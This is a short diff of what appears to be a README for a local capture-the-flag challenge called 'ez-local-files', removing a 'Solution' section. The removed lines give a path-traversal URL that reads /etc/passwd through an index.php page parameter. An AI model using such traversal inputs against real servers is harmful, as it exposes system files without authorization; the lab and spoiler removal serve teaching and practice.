@@ -11,6 +11,3 @@ docker run -dp 80:80 ez-local-files
 
 Visit [http://localhost](http://localhost)
 
-### Solution
-Read /etc/passwd by going to
-http://localhost/index.php?page=../../../etc/passwd
